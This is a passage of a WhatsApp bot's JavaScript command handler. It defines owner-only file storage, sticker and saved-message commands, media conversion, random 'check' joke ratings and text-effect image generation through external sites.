          teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipNhd.length}*`;
          replygcnhd(teksooooo);
        }
        break;
      case "addapk":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1)
            return replygcnhd("What is the name of the apk?");
          let teks = `${text}`;
          {
            if (ApkNhd.includes(teks))
              return replygcnhd("This name is already in use");
            let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            apknye.push(teks);
            await fsx.copy(delb, `./NhdMedia/apk/${teks}.apk`);
            fs.writeFileSync(
              "./NhdMedia/database/apk.json",
              JSON.stringify(ApkNhd)
            );
            fs.unlinkSync(delb);
            replygcnhd(`Successful Adding apk\nTo Check type ${prefix}listapk`);
          }
        }
        break;
      case "delapk":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1) return replygcnhd("Name of the apk?");
          let teks = `${text}`;
          {
            if (!ApkNhd.includes(teks))
              return replygcnhd("This name does not exist in the database");
            let wanu = ApkNhd.indexOf(teks);
            ApkNhd.splice(wanu, 1);
            fs.writeFileSync(
              "./NhdMedia/database/apk.json",
              JSON.stringify(ApkNhd)
            );
            fs.unlinkSync(`./NhdMedia/apk/${teks}.apk`);
            replygcnhd(`Successfully deleted Apk ${teks}`);
          }
        }
        break;
      case "listapk":
        {
          await loading();
          let teksoooooo = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let x of ApkNhd) {
            teksoooooo += `│⭔ ${x}\n`;
          }
          teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkNhd.length}`;
          replygcnhd(teksoooooo);
        }
        break;
      case "addpdf":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1) return replygcnhd("What is the name of the pdf");
          let teks = `${text}`;
          {
            if (DocNhd.includes(teks))
              return replygcnhd("This name is already in use");
            let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            docunye.push(teks);
            await fsx.copy(delb, `./NhdMedia/doc/${teks}.pdf`);
            fs.writeFileSync(
              "./NhdMedia/database/doc.json",
              JSON.stringify(DocNhd)
            );
            fs.unlinkSync(delb);
            replygcnhd(`Successful Adding Pdf\nTo check type ${prefix}listpdf`);
          }
        }
        break;
      case "delpdf":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1) return replygcnhd("Enter the name");
          let teks = `${text}`;
          {
            if (!DocNhd.includes(teks))
              return replygcnhd("This name does not exist in the database");
            let wanu = DocApk.indexOf(teks);
            docunye.splice(wanu, 1);
            fs.writeFileSync(
              "./NhdMedia/database/doc.json",
              JSON.stringify(DocNhd)
            );
            fs.unlinkSync(`./NhdMedia/doc/${teks}.pdf`);
            replygcnhd(`Successfully deleted pdf ${teks}`);
          }
        }
        break;
      case "listpdf":
        {
          await loading();
          let teksoooo = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let x of docunye) {
            teksoooo += `│⭔ ${x}\n`;
          }
          teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`;
          replygcnhd(teksoooo);
        }
        break;
      case "addowner":
        if (!NhdTheCreator) return NhdStickOwner();
        if (!args[0])
          return replygcnhd(
            `Use ${prefix + command} number\nExample ${
              prefix + command
            } ${ownernumber}`
          );
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let ceknye = await NhdBotFunc.onWhatsApp(bnnd);
        if (ceknye.length == 0)
          return replygcnhd(
            `Enter A Valid And Registered Number On WhatsApp!!!`
          );
        owner.push(bnnd);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        replygcnhd(`Number ${bnnd} Has Become An Owner!!!`);
        break;
      case "delowner":
        if (!NhdTheCreator) return NhdStickOwner();
        if (!args[0])
          return replygcnhd(
            `Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 916909137213`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        replygcnhd(
          `The Numbrr ${ya} Has been deleted from owner list by the owner!!!`
        );
        break;
      case "listpremium":
      case "listprem":
        teks = "*Premium List*\n\n";
        for (let NhdBotFunc of prem) {
          teks += `- ${NhdBotFunc}\n`;
        }
        teks += `\n*Total : ${prem.length}*`;
        NhdBotFunc.sendMessage(
          m.chat,
          { text: teks.trim() },
          "extendedTextMessage",
          { quoted: m, contextInfo: { mentionedJid: prem } }
        );
        break;
      case "setcmd":
        {
          if (!m.quoted) return replygcnhd("Reply Message!");
          if (!m.quoted.fileSha256) return replygcnhd("SHA256 Hash Missing");
          if (!text) return replygcnhd(`For What Command?`);
          let hash = m.quoted.fileSha256.toString("base64");
          if (global.db.sticker[hash] && global.db.sticker[hash].locked)
            return replygcnhd(
              "You have no permission to change this sticker command"
            );
          global.db.sticker[hash] = {
            text,
            mentionedJid: m.mentionedJid,
            creator: m.sender,
            at: +new Date(),
            locked: false,
          };
          replygcnhd(`Done!`);
        }
        break;
      case "delcmd":
        {
          let hash = m.quoted.fileSha256.toString("base64");
          if (!hash) return replygcnhd(`No hashes`);
          if (global.db.sticker[hash] && global.db.sticker[hash].locked)
            return replygcnhd(
              "You have no permission to delete this sticker command"
            );
          delete global.db.sticker[hash];
          replygcnhd(`Done!`);
        }
        break;
      case "listcmd":
        {
          let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker)
  .map(
    ([key, value], index) =>
      `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`
  )
  .join("\n")}
`.trim();
          NhdBotFunc.sendText(m.chat, teks, m, {
            mentions: Object.values(global.db.sticker)
              .map((x) => x.mentionedJid)
              .reduce((a, b) => [...a, ...b], []),
          });
        }
        break;
      case "lockcmd":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!m.quoted) return replygcnhd("Reply Message!");
          if (!m.quoted.fileSha256) return replygcnhd("SHA256 Hash Missing");
          let hash = m.quoted.fileSha256.toString("base64");
          if (!(hash in global.db.sticker))
            return replygcnhd("Hash not found in database");
          global.db.sticker[hash].locked = !/^un/i.test(command);
          replygcnhd("Done!");
        }
        break;
      case "addmsg":
        {
          if (!m.quoted)
            return replygcnhd("Reply Message You Want To Save In Database");
          if (!text)
            return replygcnhd(`Example : ${prefix + command} filename`);
          let msgs = global.db.database;
          if (text.toLowerCase() in msgs)
            return replygcnhd(`'${text}' registered in the message list`);
          msgs[text.toLowerCase()] = quoted.fakeObj;
          replygcnhd(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`);
        }
        break;
      case "getmsg":
        {
          if (!text)
            return replygcnhd(
              `Example : ${
                prefix + command
              } file name\n\nView list of messages with ${prefix}listmsg`
            );
          let msgs = global.db.database;
          if (!(text.toLowerCase() in msgs))
            return replygcnhd(`'${text}' not listed in the message list`);
          NhdBotFunc.copyNForward(m.chat, msgs[text.toLowerCase()], true);
        }
        break;
      case "listmsg":
        {
          let msgs = JSON.parse(fs.readFileSync("./database/database.json"));
          let seplit = Object.entries(global.db.database).map(([nama, isi]) => {
            return { nama, ...isi };
          });
          let teks = " DATABASE LIST \n\n";
          for (let i of seplit) {
            teks += `${themeemoji} *Name :* ${
              i.nama
            }\n${themeemoji} *Type :* ${getContentType(i.message).replace(
              /Message/i,
              ""
            )}\n────────────────────────\n\n`;
          }
          replygcnhd(teks);
        }
        break;
      case "delmsg":
      case "deletemsg":
        {
          let msgs = global.db.database;
          if (!(text.toLowerCase() in msgs))
            return replygcnhd(`'${text}' not listed in the message list`);
          delete msgs[text.toLowerCase()];
          replygcnhd(`Successfully deleted '${text}' from the message list`);
        }
        break;
      case "setexif":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!text)
            return replygcnhd(`Example : ${prefix + command} packname|author`);
          global.packname = text.split("|")[0];
          global.author = text.split("|")[1];
          replygcnhd(
            `Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`
          );
        }
        break;
      case "setppbot":
      case "setbotpp":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!quoted)
            return replygcnhd(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (!/image/.test(mime))
            return replygcnhd(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (/webp/.test(mime))
            return replygcnhd(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          var medis = await NhdBotFunc.downloadAndSaveMediaMessage(
            quoted,
            "ppbot.jpeg"
          );
          if (args[0] == `full`) {
            var { img } = await generateProfilePicture(medis);
            await NhdBotFunc.query({
              tag: "iq",
              attrs: {
                to: botNumber,
                type: "set",
                xmlns: "w:profile:picture",
              },
              content: [
                {
                  tag: "picture",
                  attrs: { type: "image" },
                  content: img,
                },
              ],
            });
            fs.unlinkSync(medis);
            replygcnhd(`Success`);
          } else {
            var memeg = await NhdBotFunc.updateProfilePicture(botNumber, {
              url: medis,
            });
            fs.unlinkSync(medis);
            replygcnhd(`Success`);
          }
        }
        break;
      case "creategc":
      case "creategroup":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!args.join(" "))
            return replygcnhd(`Use ${prefix + command} groupname`);
          try {
            let cret = await NhdBotFunc.groupCreate(args.join(" "), []);
            let response = await NhdBotFunc.groupInviteCode(cret.id);
            teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000)
              .tz("Asia/Kolkata")
              .format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `;
            NhdBotFunc.sendMessage(
              m.chat,
              { text: teks, mentions: await NhdBotFunc.parseMention(teks) },
              { quoted: m }
            );
          } catch {
            replygcnhd("Error!");
          }
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!quoted) return replygcnhd("Reply to Sticker");
          if (!/webp/.test(mime))
            return replygcnhd(
              `reply sticker with caption *${prefix + command}*`
            );
          await NhdStickWait();
          let { webp2mp4File } = require("./lib/uploader");
          let media = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          let webpToMp4 = await webp2mp4File(media);
          await NhdBotFunc.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcnhd(
              `Send/Reply Video/Audio You Want to Use as Audio With Caption ${
                prefix + command
              }`
            );
          if (!quoted)
            return replygcnhd(
              `Send/Reply Video/Audio You Want to Use as Audio With Caption ${
                prefix + command
              }`
            );
          await NhdStickWait();
          let media = await quoted.download();
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          NhdBotFunc.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg" },
            { quoted: m }
          );
        }
        break;
      case "tomp3":
        {
          if (/document/.test(mime))
            return replygcnhd(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcnhd(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          if (!quoted)
            return replygcnhd(
              `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${
                prefix + command
              }`
            );
          await NhdStickWait();
          let media = await quoted.download();
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          NhdBotFunc.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mpeg",
              fileName: `Convert By ${NhdBotFunc.user.name}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replygcnhd(
              `Reply Video/Audio That You Want To Be VN With Caption ${
                prefix + command
              }`
            );
          if (!quoted)
            return replygcnhd(
              `Reply Video/Audio That You Want To Be VN With Caption ${
                prefix + command
              }`
            );
          await NhdStickWait();
          let media = await quoted.download();
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          NhdBotFunc.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg", ptt: true },
            { quoted: m }
          );
        }
        break;
      case "togif":
        {
          if (!quoted) return replygcnhd("Reply video");
          if (!/webp/.test(mime))
            return replygcnhd(
              `reply sticker with caption *${prefix + command}*`
            );
          await NhdStickWait();
          let { webp2mp4File } = require("./lib/uploader");
          let media = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          let webpToMp4 = await webp2mp4File(media);
          await NhdBotFunc.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toqr":
        {
          if (!q) return replygcnhd(" Please include link or text!");
          const QrCode = require("qrcode-reader");
          const qrcode = require("qrcode");
          let qyuer = await qrcode.toDataURL(q, { scale: 35 });
          let data = new Buffer.from(
            qyuer.replace("data:image/png;base64,", ""),
            "base64"
          );
          let buff = getRandom(".jpg");
          await fs.writeFileSync("./" + buff, data);
          let medi = fs.readFileSync("./" + buff);
          await NhdBotFunc.sendMessage(
            from,
            { image: medi, caption: "Here you go!" },
            { quoted: m }
          );
          setTimeout(() => {
            fs.unlinkSync(buff);
          }, 10000);
        }
        break;
      case "toimg":
        {
          await NhdStickWait();
          const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`;
          };
          if (!m.quoted) return replygcnhd(`_Reply to Any Sticker._`);
          let mime = m.quoted.mtype;
          if (mime == "imageMessage" || mime == "stickerMessage") {
            let media = await NhdBotFunc.downloadAndSaveMediaMessage(m.quoted);
            let name = await getRandom(".png");
            exec(`ffmpeg -i ${media} ${name}`, (err) => {
              fs.unlinkSync(media);
              let buffer = fs.readFileSync(name);
              NhdBotFunc.sendMessage(m.chat, { image: buffer }, { quoted: m });
              fs.unlinkSync(name);
            });
          } else return replygcnhd(`Please reply to non animated sticker`);
        }
        break;
      case "swm":
      case "steal":
      case "stickerwm":
      case "take":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args.join(" ")) return replygcnhd(`Where is the text?`);
          const swn = args.join(" ");
          const pcknm = swn.split("|")[0];
          const atnm = swn.split("|")[1];
          if (m.quoted.isAnimated === true) {
            NhdBotFunc.downloadAndSaveMediaMessage(quoted, "gifee");
            NhdBotFunc.sendMessage(
              from,
              { sticker: fs.readFileSync("gifee.webp") },
              { quoted: m }
            );
          } else if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await NhdBotFunc.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replygcnhd("Maximum 10 Seconds!");
            let media = await quoted.download();
            let encmedia = await NhdBotFunc.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else {
            replygcnhd(`Photo/Video?`);
          }
        }
        break;
      case "qc":
      case "text":
        {
          if (!args[0] && !m.quoted) {
            return replygcnhd(`Where is the text?`);
          }
          let userPfp;
          if (m.quoted) {
            try {
              userPfp = await NhdBotFunc.profilePictureUrl(
                m.quoted.sender,
                "image"
              );
            } catch (e) {
              userPfp = defaultpp;
            }
          } else {
            try {
              userPfp = await NhdBotFunc.profilePictureUrl(m.sender, "image");
            } catch (e) {
              userPfp = defaultpp;
            }
          }
          const waUserName = pushname;
          const quoteText = m.quoted ? m.quoted.body : args.join(" ");
          const quoteJson = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 700,
            height: 580,
            scale: 2,
            messages: [
              {
                entities: [],
                avatar: true,
                from: {
                  id: 1,
                  name: waUserName,
                  photo: {
                    url: userPfp,
                  },
                },
                text: quoteText,
                replyMessage: {},
              },
            ],
          };
          try {
            const quoteResponse = await axios.post(
              "https://bot.lyo.su/quote/generate",
              quoteJson,
              {
                headers: { "Content-Type": "application/json" },
              }
            );
            const buffer = Buffer.from(
              quoteResponse.data.result.image,
              "base64"
            );
            NhdBotFunc.sendImageAsSticker(m.chat, buffer, m, {
              packname: packname,
              author: author,
            });
          } catch (error) {
            console.error(error);
            replygcnhd("Error");
          }
        }
        break;
      case "s":
      case "sticker":
      case "stiker":
        {
          if (!quoted)
            return replygcnhd(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await NhdBotFunc.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replygcnhd(
                "Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds"
              );
            let media = await quoted.download();
            let encmedia = await NhdBotFunc.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else {
            replygcnhd(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          }
        }
        break;
      case "quotes":
        const quotenhdy = await axios.get(`https://favqs.com/api/qotd`);
        const textquotes = `*${themeemoji} Quote:* ${quotenhdy.data.quote.body}\n\n*${themeemoji} Author:* ${quotenhdy.data.quote.author}`;
        return replygcnhd(textquotes);
        break;
      case "handsomecheck":
        if (!text)
          return replygcnhd(`Tag Someone, Example : ${prefix + command} @Nhd`);
        const gan = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const teng = gan[Math.floor(Math.random() * gan.length)];
        NhdBotFunc.sendMessage(
          from,
          { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` },
          { quoted: m }
        );
        break;
      case "beautifulcheck":
        if (!text)
          return replygcnhd(`Tag Someone, Example : ${prefix + command} @Nhd`);
        const can = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const tik = can[Math.floor(Math.random() * can.length)];
        NhdBotFunc.sendMessage(
          from,
          { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` },
          { quoted: m }
        );
        break;
      case "charactercheck":
        if (!text)
          return replygcnhd(`Tag Someone, Example : ${prefix + command} @Nhd`);
        const nhdy = [
          "Compassionate",
          "Generous",
          "Grumpy",
          "Forgiving",
          "Obedient",
          "Good",
          "Simp",
          "Kind-Hearted",
          "patient",
          "UwU",
          "top, anyway",
          "Helpful",
        ];
        const taky = nhdy[Math.floor(Math.random() * nhdy.length)];
        NhdBotFunc.sendMessage(
          from,
          { text: `Character Check : ${q}\nAnswer : *${taky}*` },
          { quoted: m }
        );
        break;
      case "awesomecheck":
      case "greatcheck":
      case "gaycheck":
      case "cutecheck":
      case "lesbicheck":
      case "lesbiancheck":
      case "hornycheck":
      case "prettycheck":
      case "lovelycheck":
      case "uglycheck":
        if (!m.isGroup) return NhdStickGroup();
        const cex = body.slice(0);
        const cek1 = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const cek2 = cek1[Math.floor(Math.random() * cek1.length)];
        if (mentionByReply) {
          NhdBotFunc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByReply.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByReply],
            },
            { quoted: m }
          );
        } else if (mentionByTag[0] && isGroup) {
          NhdBotFunc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByTag[0].split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByTag[0]],
            },
            { quoted: m }
          );
        } else if (!mentionByReply && !mentionByTag[0]) {
          NhdBotFunc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${sender.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [sender],
            },
            { quoted: m }
          );
        }
        break;
      case "obfus":
      case "obfuscate":
        {
          if (!q)
            return replygcnhd(
              `Example ${prefix + command} const nhdbot = require('baileys')`
            );
          let meg = await obfus(q);
          replygcnhd(`Success
${meg.result}`);
        }
        break;
      case "style":
      case "styletext":
        {
          let { styletext } = require("./lib/scraper");
          if (!text) return replygcnhd("Enter Query text!");
          let anu = await styletext(text);
          let teks = `Style Text From ${text}\n\n`;
          for (let i of anu) {
            teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`;
          }
          replygcnhd(teks);
        }
        break;
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloredneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
          if (!q) return replygcnhd(`Example : ${prefix + command} NhdBotFunc`);
          await NhdStickWait();
          let link;
          if (/glitchtext/.test(command))
            link =
              "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          if (/writetext/.test(command))
            link =
              "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          if (/advancedglow/.test(command))
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          if (/typographytext/.test(command))
            link =
              "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          if (/pixelglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          if (/neonglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          if (/flagtext/.test(command))
            link =
              "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          if (/flag3dtext/.test(command))
            link =
              "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          if (/deletingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          if (/blackpinkstyle/.test(command))
            link =
              "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          if (/glowingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          if (/underwatertext/.test(command))
            link =
              "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          if (/logomaker/.test(command))
            link =
              "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          if (/cartoonstyle/.test(command))
            link =
              "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          if (/papercutstyle/.test(command))
            link =
              "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          if (/watercolortext/.test(command))
            link =
              "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          if (/effectclouds/.test(command))
            link =
              "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          if (/blackpinklogo/.test(command))
            link =
              "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          if (/gradienttext/.test(command))
            link =
              "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          if (/summerbeach/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          if (/luxurygold/.test(command))
            link =
              "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          if (/multicoloredneon/.test(command))
            link =
              "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
          if (/sandsummer/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          if (/galaxywallpaper/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          if (/1917style/.test(command))
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          if (/makingneon/.test(command))
            link =
              "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          if (/royaltext/.test(command))
            link =
              "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          if (/freecreate/.test(command))
            link =
              "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          if (/galaxystyle/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          if (/lighteffects/.test(command))
            link =
              "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          let haldwhd = await ephoto(link, q);
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: haldwhd }, caption: `${mess.success}` },
            { quoted: m }
          );
        }
        break;
      case "shadow":
      case "write":
      case "romantic":
      case "burnpaper":
      case "smoke":
      case "narutobanner":
      case "love":
      case "undergrass":
      case "doublelove":
      case "coffecup":
      case "underwaterocean":
      case "smokyneon":
      case "starstext":
      case "rainboweffect":
      case "balloontext":
      case "metalliceffect":
      case "embroiderytext":
      case "flamingtext":
      case "stonetext":
      case "writeart":
      case "summertext":
      case "wolfmetaltext":
      case "nature3dtext":
      case "rosestext":
      case "naturetypography":
      case "quotesunder":
      case "shinetext":
        {
          if (!q) return replygcnhd(`Example : ${prefix + command} NhdBotFunc`);
          await NhdStickWait();
          let link;
          if (/stonetext/.test(command))
            link =
              "https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html";
          if (/writeart/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html";
          if (/summertext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html";
          if (/wolfmetaltext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html";
          if (/nature3dtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html";
          if (/rosestext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html";
          if (/naturetypography/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html";
          if (/quotesunder/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html";
          if (/shinetext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html";
          if (/shadow/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html";
          if (/write/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html";
          if (/romantic/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html";
          if (/burnpaper/.test(command))
            link =
